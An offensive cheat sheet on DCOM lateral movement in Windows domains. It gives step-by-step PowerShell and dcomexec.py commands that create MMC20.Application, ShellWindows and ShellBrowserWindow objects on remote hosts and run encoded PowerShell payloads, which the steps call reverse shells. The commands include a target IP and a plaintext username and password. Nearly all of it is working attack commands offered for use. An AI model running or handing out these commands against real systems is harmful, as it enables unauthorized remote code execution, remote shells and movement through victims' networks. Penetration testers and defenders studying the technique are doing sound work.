# 05.01 DCOM Lateral Movement

> Pop code via DCOM with `MMC20.Application`, `ShellWindows`, or `ShellBrowserWindow` CLSIDs — `dcomexec.py` wraps all three from Linux.

## Overview

DCOM (TCP 135 + dynamic 49152-65535) allows code execution via COM objects instantiated on remote hosts. Membership in Distributed COM Users or Administrators is required. From Windows: MMC20.Application (`ExecuteShellCommand`), ShellWindows, and ShellBrowserWindow (via CLSID) each provide code execution primitives. From Linux, dcomexec.py wraps MMC20/ShellWindows/ShellBrowserWindow; use `-no-output` when port 445 is unavailable.

## Steps

- Enumerate with `nmap -p135,49152-65535`; requires Distributed COM Users or Administrators membership.
- Windows MMC20: `[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))` then `$mmc.Document.ActiveView.ExecuteShellCommand(...)`.
- Windows ShellWindows CLSID: find CLSID via `Get-ChildItem HKLM:\SOFTWARE\Classes\CLSID`; instantiate with `GetTypeFromCLSID`.
- Windows ShellBrowserWindow CLSID: `C08AFD90-F2A1-11D1-8455-00A0C91F3880`; use `$shell[0].Document.Application.ShellExecute(...)`.
- All Windows PowerShell parameters: Command, Directory ($null), Parameters (reverse shell), WindowState (0).
- From Linux: `dcomexec.py -object MMC20` (or ShellWindows/ShellBrowserWindow) + `-silentcommand` suppresses errors; `-no-output` avoids port 445.

## Commands

### nmap DCOM

```bash
nmap -p135,49152-65535 <TARGET> -sCV -Pn
```

### MMC20 — create instance (Windows)

```powershell
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"))
```

### MMC20 — ExecuteShellCommand

```powershell
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
```

### ShellWindows — find CLSID

```powershell
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}
```

### ShellWindows — create instance

```powershell
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52"))
```

### ShellWindows — ShellExecute

```powershell
$shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow — create instance

```powershell
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02"))
```

### dcomexec.py MMC20

```bash
proxychains4 -q python3 dcomexec.py -object MMC20 <DOMAIN>/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand
```
